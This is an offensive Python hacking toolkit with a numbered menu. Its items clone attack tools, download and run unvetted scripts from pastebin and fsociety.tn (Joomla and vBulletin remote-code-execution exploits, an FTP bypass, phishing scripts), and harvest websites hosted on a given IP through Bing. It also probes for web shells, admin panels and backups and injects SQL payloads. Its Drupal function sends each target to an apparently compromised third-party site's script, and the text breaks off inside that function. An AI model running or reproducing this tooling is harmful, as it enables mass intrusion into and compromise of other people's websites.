#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import argparse
import os
import time
import http.client
import subprocess
import re
import urllib.request
import urllib.error
import urllib.parse
import socket
import json
import telnetlib
import glob
import random
import queue
import threading
import base64
from getpass import getpass
from sys import argv
from platform import system
from urllib.parse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep

##########################
# Variables
directories = [
    '/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/',
    '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/',
    '/UsersFiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
    '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/',
    '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/',
    '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/',
    '/AlumniPhotos/', '/users/'
]
shells = [
    'wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php',
    'cp.php', 'upload.php', 'sh.php', 'pk.php', 'mad.php', 'x00x.php',
    'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php'
]
upload = []
yes = {"yes", "y", "ye", "Y"}
no = {"no", "n"}
ditect = ['13', '14', '15', '16', '17', '18', '19', '20', '21']
heathenchoice = ['4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
##########################


def logo():
    print("""
***************************
  NoobSecToolkit TOOLBOX
***************************
""")


def menu():
    print("""
***************************
  NoobSecToolkit TOOLBOX
***************************
    Select from the menu:

    1 : Information Gathering
    2 : Password Attacks
    3 : Wireless Testing
    4 : Exploitation Tools
    5 : Sniffing & Spoofing
    6 : Web Hacking
    7 : Private Tools
    8 : Post Exploitation
    9 : Recon
    10: Smartphones Penetration
    99: Exit
    """)
    choice = input("Enter Your Choice: ").strip()

    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        webhack()
    elif choice == "7":
        tnn()
    elif choice == "8":
        postexp()
    elif choice == "9":
        sniper()
    elif choice == "10":
        phones()
    elif choice == "99":
        clearScr()
        sys.exit()
    else:
        menu()


def sniper():
    print("This tool is only available for Linux / OSX or similar systems.")
    choicesniper = input("Continue Y / N: ").strip()
    if choicesniper in yes:
        os.system("git clone https://github.com/1N3/Sn1per.git")
        os.system("cd Sn1per && sudo bash ./install.sh")
        os.system("sniper")
    else:
        menu()


def phones():
    logo()
    print("""
    1.)  Attach Framework to a Deployed Agent/Create Agent
    2.)  Send Commands to an Agent
    3.)  View Information Gathered
    4.)  Attach Framework to a Mobile Modem
    5.)  Run a remote attack
    6.)  Run a social engineering or client side attack
    7.)  Compile code to run on mobile devices
    8.)  Install Stuff
    9.)  Use Drozer
    10.) Setup API
    11.) Bruteforce the Android Passcode given the hash and salt
    0.)  Exit
    """)
    choicespf = input("Select an option: ").strip()
    if choicespf in [str(i) for i in range(1, 11)]:
        oschoice = input("""This option will install Smartphone Pentest Framework.
    1) OSX
    2) Kali Linux
    3) BackTrack
    Select your OS: """).strip()
        if oschoice == "1":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash osxinstall.sh")
        if oschoice == "2":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash kaliinstall")
        if oschoice == "3":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash btinstall")
    elif choicespf == "11":
        androidhash()
    else:
        menu()


def doork():
    print("doork is a passive vulnerability auditor tool using Google dorks.")
    doorkchice = input("Continue Y / N: ").strip()
    if doorkchice in yes:
        os.system("pip3 install beautifulsoup4 && pip3 install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = input("Target: ").strip()
        os.system("cd doork && python3 doork.py -t %s -o log.log" % doorkt)


def postexp():
    clearScr()
    print("1:  Shell Checker")
    print("2:  POET")
    print("3:  Weeman - Phishing Framework")
    print("4:  Insecure Web Interface")
    print("5:  Insufficient Authentication/Authorization")
    print("6:  Insecure Network Services")
    print("7:  Lack of Transport Encryption")
    print("8:  Privacy Concerns")
    print("9:  Insecure Cloud Interface")
    print("10: Insecure Mobile Interface")
    print("11: Insufficient Security Configurability")
    print("12: Insecure Software/Firmware")
    print("13: Poor Physical Security")
    print("99: Return to main menu")
    choice11 = input("Enter Your Choice: ").strip()
    if choice11 == "1":
        sitechecker()
    elif choice11 == "2":
        poet()
    elif choice11 == "3":
        weeman()
    elif choice11 in heathenchoice:
        print("This Tool Will Work only on kali linux.")
        hchoice = input("Continue? Y / N: ").strip()
        if hchoice in yes:
            os.system("git clone https://github.com/chihebchebbi/Internet-Of-Things-Pentesting-Framework.git heathen && cd heathen && bash Heathen.sh")
        else:
            postexp()
    elif choice11 == "99":
        menu()


def scanusers():
    site = input("Enter a website: ").strip()
    try:
        users = site
        for prefix in ["http://www.", "http://", ".", "-", "/"]:
            users = users.replace(prefix, "")
        while len(users) > 2:
            print(users)
            try:
                resp = urllib.request.urlopen(
                    site + "/cgi-sys/guestbook.cgi?user=%s" % users
                ).read().decode("utf-8", errors="ignore")
                if "invalid username" not in resp.lower():
                    print("\tFound -> %s" % users)
            except Exception:
                pass
            users = users[:-1]
    except Exception:
        pass


def brutex():
    clearScr()
    print("Automatically brute force all services running on a target.")
    os.system("git clone https://github.com/1N3/BruteX.git")
    brutexchoice = input("Select a Target: ").strip()
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)


def arachni():
    print("Arachni is a web application security scanner framework.")
    cara = input("Install And Run? Y / N: ").strip()
    clearScr()
    print("Example: http://www.target.com/")
    tara = input("Select a target to scan: ").strip()
    if cara in yes:
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system("cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("arachni")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)


def xsstracer():
    clearScr()
    print("XSSTracer checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
    os.system("git clone https://github.com/1N3/XSSTracer.git")
    clearScr()
    xsstracerchoice = input("Select a Target: ").strip()
    os.system("cd XSSTracer && chmod 777 xsstracer.py && python3 xsstracer.py %s 80" % xsstracerchoice)


def weeman():
    print("HTTP server for phishing in python.")
    choicewee = input("Install Weeman? Y / N: ").strip()
    if choicewee in yes:
        os.system("git clone https://github.com/Hypsurus/weeman.git && cd weeman && python3 weeman.py")
    else:
        menu()


def gabriel():
    print("Abusing authentication bypass (FTP)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python3 gabriel.py")
    ftpbypass = input("Enter Target IP and Use Command: ").strip()
    os.system("python3 gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python3 ch01.py")


def h2ip():
    host = input("Select A Host: ").strip()
    ips = socket.gethostbyname(host)
    print(ips)


def ports():
    clearScr()
    target = input("Select a Target IP: ").strip()
    os.system("nmap -O -Pn %s" % target)
    sys.exit()


def ifinurl():
    print("Advanced search engine exploit scanner using Google dorks.")
    print("Do You Want To Install InurlBR?")
    cinurl = input("Y/N: ").strip()
    if cinurl in yes:
        inurl()
    else:
        menu()


def bsqlbf():
    clearScr()
    print("This tool will only work on blind SQL injection.")
    cbsq = input("Select target: ").strip()
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


def venom():
    print("Venom Automatic Shellcode Generator")
    print("Do You Want To Install Venom?")
    choiceshell = input("Y/N: ").strip()
    if choiceshell in yes:
        os.system("wget http://fsociety.tn/venom.zip --output-document=venom.zip")
        os.system("unzip venom.zip -d venom")
        os.system("cd venom && sh venom.sh")
    elif choiceshell in no:
        clearScr()
        info()


def commix():
    print("Automated All-in-One OS Command Injection and Exploitation Tool.")
    print("Usage: python3 commix.py --help")
    choicecmx = input("Continue: y/n: ").strip()
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix && python3 commix.py")
    elif choicecmx in no:
        clearScr()
        info()


def pixiewps():
    print('Pixiewps is a tool to bruteforce offline the WPS pin (pixie dust attack).')
    choicewps = input("Continue? Y/N: ").strip()
    if choicewps in yes:
        os.system("git clone https://github.com/wiire/pixiewps.git")
        os.system("cd pixiewps/src && make")
        os.system("cd pixiewps/src && sudo make install")
    else:
        menu()


def webhack():
    print("1 : Drupal Hacking")
    print("2 : Inurlbr")
    print("3 : Wordpress & Joomla Scanner")
    print("4 : Gravity Form Scanner")
    print("5 : File Upload Checker")
    print("6 : Wordpress Exploit Scanner")
    print("7 : Wordpress Plugins Scanner")
    print("8 : Shell and Directory Finder")
    print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
    print("10: Vbulletin 5.X remote code execution")
    print("11: BruteX - Brute force all services on a target")
    print("12: Arachni - Web Application Security Scanner")
    print("13: Sub-domain Scanning")
    print("14: Wordpress Scanning")
    print("15: Wordpress Username Enumeration")
    print("16: Wordpress Backup Grabbing")
    print("17: Sensitive File Detection")
    print("18: Same-Site Scripting Scanning")
    print("19: Click Jacking Detection")
    print("20: XSS vulnerability scanning")
    print("21: SQL Injection vulnerability scanning")
    print("99: Exit")
    choiceweb = input("Enter Your Choice: ").strip()
    if choiceweb == "1":
        clearScr()
        maine()
    elif choiceweb == "2":
        clearScr()
        ifinurl()
    elif choiceweb == "3":
        clearScr()
        wppjmla()
    elif choiceweb == "4":
        clearScr()
        gravity()
    elif choiceweb == "5":
        clearScr()
        sqlscan()
    elif choiceweb == "6":
        clearScr()
        wpminiscanner()
    elif choiceweb == "7":
        clearScr()
        wppluginscan()
    elif choiceweb == "8":
        clearScr()
        shelltarget()
    elif choiceweb == "9":
        clearScr()
        joomlarce()
    elif choiceweb == "10":
        clearScr()
        vbulletinrce()
    elif choiceweb == "11":
        clearScr()
        brutex()
    elif choiceweb == "12":
        clearScr()
        arachni()
    elif choiceweb in ditect:
        dtect()
    elif choiceweb == "99":
        menu()
    else:
        menu()


def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("If the response is 200, you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = input("Select a targets list: ").strip()
    os.system("python3 temp.py %s" % jmtarget)


def inurl():
    dork = input("Select a Dork: ").strip()
    output = input("Select a file to save: ").strip()
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))


def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv SCANNER-INURLBR/inurlbr.php inurlbr.php")
    clearScr()
    inurl()


def dtect():
    print("This will install and run D-TECT Penetration testing framework.")
    cdtect = input("Continue? Y/N: ").strip()
    if cdtect in yes:
        os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT.git && cd D-TECT && python3 d-tect.py")
    else:
        menu()


def nmap():
    choice7 = input("Continue? Y / N: ").strip()
    if choice7 in yes:
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 && ./configure")
        os.system("cd nmap-7.01 && make")
        os.system("cd nmap-7.01 && sudo make install")
    elif choice7 in no:
        info()
    else:
        menu()


def jboss():
    os.system("clear")
    print("This JBoss script deploys a JSP shell on the target JBoss AS server.")
    print("Usage: ./e.sh target_ip tcp_port")
    choice9 = input("Continue yes / no: ").strip()
    if choice9 in yes:
        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git")
        sys.exit()
    elif choice9 in no:
        clearScr()
        exp()
    else:
        menu()


def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = input("Sites file: ").strip()
    filepath = input("Plugins file: ").strip()

    def scan(site, plugin_dir):
        global resp
        try:
            conn = http.client.HTTPConnection(site)
            conn.request("HEAD", "/wp-content/plugins/" + plugin_dir)
            resp = conn.getresponse().status
        except Exception as message:
            print("Can't Connect:", message)

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def run():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
            for plugin in plugins:
                plugin = plugin.rstrip()
                scan(site, plugin)
                if resp not in Notfound:
                    print("+----------------------------------------+")
                    print("| Current site: " + site)
                    print("| Found Plugin: " + plugin)
                    print("| Result:", resp)

    run()


def sqlmap_tool():
    print("Usage: python3 sqlmap.py -h")
    choice8 = input("Continue: y/n: ").strip()
    if choice8 in yes:
        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
    elif choice8 in no:
        clearScr()
        info()
    else:
        menu()


def grabuploadedlink(url):
    try:
        for d in directories:
            try:
                response = urllib.request.urlopen(url + d)
                code = response.getcode()
                if code in (200, 403):
                    print("-------------------------")
                    print("  [ + ] Found Directory: " + str(url + d) + " [ + ]")
                    print("-------------------------")
                    upload.append(url + d)
            except Exception:
                pass
    except Exception:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                try:
                    response = urllib.request.urlopen(upl + shell)
                    if response.getcode() == 200:
                        print("-------------------------")
                        print("  [ ! ] Found Shell: " + str(upl + shell) + " [ ! ]")
                        print("-------------------------")
                except Exception:
                    pass
    except Exception:
        pass


def shelltarget():
    print("Example: http://target.com")
    line = input("Target: ").strip()
    grabuploadedlink(line)
    grabshell(line)


def poet():
    print("POET is a simple Post-Exploitation Tool.")
    choicepoet = input("y / n: ").strip()
    if choicepoet in yes:
        os.system("git clone https://github.com/mossberg/poet.git")
        os.system("python3 poet/server.py")
    else:
        menu()


def setoolkit():
    print("The Social-Engineer Toolkit - open-source penetration testing framework for social engineering.")
    choiceset = input("Install? y / n: ").strip()
    if choiceset in yes:
        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python3 social-engineer-toolkit/setup.py")
    else:
        menu()


def cupp():
    print("cupp is a password list generator.")
    print("Usage: python3 cupp.py -h")
    choicecupp = input("Continue: y/n: ").strip()
    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("File downloaded successfully.")
    elif choicecupp in no:
        clearScr()
        passwd()
    else:
        menu()


def ncrack():
    print("Ncrack - Network authentication cracking tool.")
    print("Continue: y/n")
    choicencrack = input("y / n: ").strip()
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack && gem install ruby-ncrack")
    elif choicencrack in no:
        clearScr()
        passwd()
    else:
        menu()


def reaver():
    print("""
    Reaver - Wi-Fi Protected Setup (WPS) attack tool.
    Recovers WPA/WPA2 passphrases via WPS registrar PIN brute force.
    """)
    creaver = input("Continue? y / n: ").strip()
    if creaver in yes:
        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src && ./configure")
        os.system("cd reaver-wps-fork-t6x/src && make")
    elif creaver in no:
        clearScr()
        wire()
    else:
        menu()


def ssls():
    print("""sslstrip is a MITM tool implementing Moxie Marlinspike's SSL stripping attacks.""")
    cssl = input("y / n: ").strip()
    if cssl in yes:
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python3-twisted")
        os.system("python3 sslstrip/setup.py")
    else:
        menu()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read().decode("utf-8", errors="ignore")
            findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
            for allnoclean in findwebs:
                findall1 = re.findall(r"http://(.*?)/", allnoclean)
                for idx, item in enumerate(findall1):
                    if "www" not in item:
                        findall1[idx] = "http://www." + item + "/"
                    else:
                        findall1[idx] = "http://" + item + "/"
                lista.extend(findall1)
            page += 50
        except urllib.error.URLError:
            pass
    return unique(lista)


def check_gravityforms(sites):
    gravityforms = []
    for site in sites:
        try:
            resp = urllib.request.urlopen(site + "wp-content/plugins/gravityforms/gravityforms.php")
            if resp.getcode() == 403:
                gravityforms.append(site)
        except Exception:
            pass
    return gravityforms


def gravity():
    ip = input("Enter IP: ").strip()
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print(ss)
    print("\n[*] Found %d gravityforms." % len(gravityforms))


def shellnoob():
    print("ShellNoob - shellcode writing helper tool.")
    cshell = input("Y / N: ").strip()
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python3 shellnoob.py --install")
    else:
        menu()


def info():
    print("1: nmap")
    print("2: Setoolkit")
    print("3: Port Scanning")
    print("4: Host To IP")
    print("5: Wordpress User Enumeration")
    print("6: CMS Scanner")
    print("7: XSSTracer")
    print("8: Doork - Google Dorks Passive Vulnerability Auditor")
    print("9: Scan A Server's Users")
    print("99: Back To Main Menu")
    choice2 = input("Select from the menu: ").strip()
    if choice2 == "1":
        clearScr()
        nmap()
    elif choice2 == "2":
        clearScr()
        setoolkit()
    elif choice2 == "3":
        clearScr()
        ports()
    elif choice2 == "4":
        clearScr()
        h2ip()
    elif choice2 == "5":
        clearScr()
        wpue()
    elif choice2 == "6":
        clearScr()
        cmsscan()
    elif choice2 == "7":
        clearScr()
        xsstracer()
    elif choice2 == "8":
        clearScr()
        doork()
    elif choice2 == "9":
        clearScr()
        scanusers()
    elif choice2 == "99":
        clearScr()
        menu()
    else:
        menu()


def cmsscan():
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    clearScr()
    xz = input("Select target: ").strip()
    os.system("cd CMSmap && sudo python3 cmsmap.py %s" % xz)


def wpue():
    os.system("git clone https://github.com/wpscanteam/wpscan.git")
    clearScr()
    xe = input("Select a Wordpress target: ").strip()
    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)


def priv8():
    tnn()


def androidhash():
    key = input("Enter the android hash: ").strip()
    salt = input("Enter the android salt: ").strip()
    os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
    os.system("cd AndroidPINCrack && python3 AndroidPINCrack.py -H %s -s %s" % (key, salt))


def passwd():
    print("1: Cupp")
    print("2: Ncrack")
    print("99: Back To Main Menu")
    choice3 = input("Select from the menu: ").strip()
    if choice3 == "1":
        clearScr()
        cupp()
    elif choice3 == "2":
        clearScr()
        ncrack()
    elif choice3 == "99":
        clearScr()
        menu()
    else:
        menu()


def bluepot():
    print("BluePot - Bluetooth honeypot framework.")
    choice = input("Continue? Y / N: ").strip()
    if choice in yes:
        os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
    else:
        menu()


def wire():
    print("1: Reaver")
    print("2: Pixiewps")
    print("3: Bluetooth Honeypot GUI Framework")
    print("99: Back To The Main Menu")
    choice4 = input("Select from the menu: ").strip()
    if choice4 == "1":
        clearScr()
        reaver()
    elif choice4 == "2":
        clearScr()
        pixiewps()
    elif choice4 == "3":
        bluepot()
    elif choice4 == "99":
        menu()
    else:
        menu()


def exp():
    print("1: Venom")
    print("2: SQLMap")
    print("3: Shellnoob")
    print("4: commix")
    print("5: FTP Auto Bypass")
    print("6: jboss-autopwn")
    print("7: Blind SQL Injection and Exploit")
    print("8: Joomla/Mambo/PHP-Nuke/XOOPS CMS SQL injection Scanner")
    print("99: Go Back To Main Menu")
    choice5 = input("Select from the menu: ").strip()
    if choice5 == "1":
        clearScr()
        venom()
    elif choice5 == "2":
        clearScr()
        sqlmap_tool()
    elif choice5 == "3":
        clearScr()
        shellnoob()
    elif choice5 == "4":
        clearScr()
        commix()
    elif choice5 == "5":
        clearScr()
        gabriel()
    elif choice5 == "6":
        clearScr()
        jboss()
    elif choice5 == "7":
        clearScr()
        bsqlbf()
    elif choice5 == "8":
        cmsfew()
    elif choice5 == "99":
        menu()
    else:
        menu()


def snif():
    print("1: Setoolkit")
    print("2: SSLstrip")
    print("3: pyPISHER")
    print("4: SMTP Mailer")
    print("99: Back To Main Menu")
    choice6 = input("Select from the menu: ").strip()
    if choice6 == "1":
        clearScr()
        setoolkit()
    elif choice6 == "2":
        clearScr()
        ssls()
    elif choice6 == "3":
        clearScr()
        pisher()
    elif choice6 == "4":
        clearScr()
        smtpsend()
    elif choice6 == "99":
        clearScr()
        menu()
    else:
        menu()


def cmsfew():
    print("Target must be running Joomla, Mambo, PHP-Nuke, or XOOPS.")
    target = input("Select a target: ").strip()
    os.system("wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python3 cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python3 smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python3 pisher.py")


menuu = """
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
"""


def clearScr():
    if system() in ("Linux", "Darwin"):
        os.system("clear")
    elif system() == "Windows":
        os.system("cls")


class TNscan:
    def __init__(self, serverip):
        self.serverip = serverip
        self.getSites(False)
        print(menuu)
        while True:
            choice = input(" Enter choice -> ").strip()
            if choice == "1":
                self.getSites(True)
            elif choice == "2":
                self.getJoomla()
            elif choice == "3":
                self.getWordpress()
            elif choice == "4":
                self.findPanels()
            elif choice == "5":
                self.findZip()
            elif choice == "6":
                self.findUp()
            elif choice == "7":
                self.getUsers()
            elif choice == "8":
                self.grabSqli()
            elif choice == "9":
                ran = input(" Enter range of ports (ex: 1-1000) -> ").strip()
                self.portScanner(1, ran)
            elif choice == "10":
                self.portScanner(2, None)
            elif choice == "11":
                self.getServerBanner()
            elif choice == "12":
                self.cloudflareBypasser()
            elif choice == "99":
                menu()
            con = input(" Continue [Y/n] -> ").strip()
            if con and con[0].upper() == "N":
                sys.exit()
            else:
                clearScr()
                print(menuu)

    def getSites(self, a):
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read().decode("utf-8", errors="ignore")
                findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
                for allnoclean in findwebs:
                    findall1 = re.findall(r"http://(.*?)/", allnoclean)
                    for idx, item in enumerate(findall1):
                        if "www" not in item:
                            findall1[idx] = "http://www." + item + "/"
                        else:
                            findall1[idx] = "http://" + item + "/"
                    lista.extend(findall1)
                page += 50
            except urllib.error.URLError:
                pass
        self.sites = unique(lista)
        if a:
            clearScr()
            print("[*] Found %d websites\n" % len(lista))
            for site in self.sites:
                print(site)

    def getWordpress(self):
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read().decode("utf-8", errors="ignore")
                findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
                for wpnoclean in findwebs:
                    findwp = re.findall(r"(.*?)\?page_id=", wpnoclean)
                    lista.extend(findwp)
                page += 50
            except Exception:
                pass
        lista = unique(lista)
        clearScr()
        print("[*] Found %d WordPress websites\n" % len(lista))
        for site in lista:
            print(site)

    def getJoomla(self):
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read().decode("utf-8", errors="ignore")
                findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
                for jmnoclean in findwebs:
                    findjm = re.findall(r"(.*?)index.php", jmnoclean)
                    lista.extend(findjm)
                page += 50
            except Exception:
                pass
        lista = unique(lista)
        clearScr()
        print("[*] Found %d Joomla websites\n" % len(lista))
        for site in lista:
            print(site)

    def findPanels(self):
        print("[~] Finding admin panels")
        adminList = [
            "admin/", "admin.php/", "wp-admin/", "administrator/",
            "login/", "login.php", "cp.php", "cp", "admincp/",
            "adm", "member", "control", "webmaster", "myadmin"
        ]
        clearScr()
        for site in self.sites:
            for admin in adminList:
                try:
                    resp = urllib.request.urlopen(site + admin)
                    if resp.getcode() == 200:
                        print("[*] Found admin panel -> " + site + admin)
                except Exception:
                    pass

    def findZip(self):
        zipList = [
            "backup.tar.gz", "backup.zip", "backup.rar", "backup.sql",
            "vb.zip", "joomla.zip", "wordpress.zip", "wordpress.rar"
        ]
        clearScr()
        print("[~] Finding zip files")
        for site in self.sites:
            for zip1 in zipList:
                try:
                    resp = urllib.request.urlopen(site + zip1)
                    if resp.getcode() == 200:
                        print("[*] Found zip file -> " + site + zip1)
                except Exception:
                    pass

    def findUp(self):
        upList = [
            "up.php", "up/up.php", "upload.php", "upload1.php",
            "vb/upload.php", "download.php"
        ]
        clearScr()
        print("[~] Finding Upload forms")
        for site in self.sites:
            for up in upList:
                try:
                    response = urllib.request.urlopen(site + up)
                    if response.getcode() == 200:
                        html = response.read().decode("utf-8", errors="ignore")
                        if re.findall(r"type=file", html):
                            print("[*] Found upload -> " + site + up)
                except Exception:
                    pass

    def getUsers(self):
        clearScr()
        print("[~] Grabbing Users")
        userslist = []
        for site1 in self.sites:
            try:
                site = site1.replace("http://www.", "").replace("http://", "").replace(".", "").replace("-", "").replace("/", "")
                while len(site) > 2:
                    try:
                        resp = urllib.request.urlopen(
                            site1 + "/cgi-sys/guestbook.cgi?user=%s" % site
                        ).read().decode("utf-8", errors="ignore")
                        if "invalid username" not in resp.lower():
                            print("\t[*] Found -> " + site)
                            userslist.append(site)
                            break
                    except Exception:
                        pass
                    site = site[:-1]
            except Exception:
                pass
        clearScr()
        for user in userslist:
            print(user)

    def cloudflareBypasser(self):
        clearScr()
        print("[~] Bypassing cloudflare")
        subdoms = ["mail", "webmail", "ftp", "direct", "cpanel"]
        for site in self.sites:
            site = site.replace("http://", "").replace("/", "")
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                continue
            for sub in subdoms:
                doo = sub + "." + site
                print("[~] Trying -> " + doo)
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print("[*] Cloudflare bypassed -> " + ddd)
                        break
                except socket.error:
                    pass

    def getServerBanner(self):
        clearScr()
        try:
            s = "http://" + self.serverip
            httpresponse = urllib.request.urlopen(s)
            print("[*] Server header -> " + str(httpresponse.headers.get("server")))
        except Exception:
            pass

    def grabSqli(self):
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read().decode("utf-8", errors="ignore")
                findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
                lista.extend(findwebs)
            except Exception:
                pass
            page += 50
        lista = unique(lista)
        self.checkSqli(lista)

    def checkSqli(self, s):
        clearScr()
        print("[~] Checking SQL injection")
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><"]
        check = re.compile(
            r"Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error",
            re.I
        )
        for url in s:
            try:
                for param in url.split("?")[1].split("&"):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())
                        try:
                            html = urllib.request.urlopen(power).read().decode("utf-8", errors="ignore")
                            if re.search(check, html):
                                print("[*] SQLi found -> " + power)
                        except Exception:
                            pass
            except Exception:
                pass

    def portScanner(self, mode, ran):
        clearScr()
        print("[~] Scanning Ports")

        def do_it(ip, port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print("[*] Port %i is open" % port)

        if mode == 1:
            a = ran.split("-")
            start = int(a[0])
            end = int(a[1])
            for i in range(start, end):
                do_it(self.serverip, i)
        elif mode == 2:
            for port in [80, 21, 22, 2082, 25, 53, 110, 443, 143]:
                do_it(self.serverip, port)


def drupal():
    ip = input("1- IP: ").strip()
    page = 1
    while page <= 50:
        url = "http://www.bing.com/search?q=ip%3A" + ip + "&first=" + str(page)
        try:
            req = urllib.request.Request(url)
            opreq = urllib.request.urlopen(req).read().decode("utf-8", errors="ignore")
            findurl = re.findall(r'<div class="b_title"><h2><a href="(.*?)" h=', opreq)
            page += 1
            for u in findurl:
                try:
                    urlpa = urlparse(u)
                    site = urlpa.netloc
                    print("[+] Testing At " + site)
                    resp = urllib.request.urlopen(
                        "http://crig-alda.ro/wp-admin/css/index2.php?url=" + site + "&submit=submit"
                    )
                    read = resp.read().decode("utf-8", errors="ignore")
                    if "User : HolaKo" in read:
                        print("Exploit found => " + site)
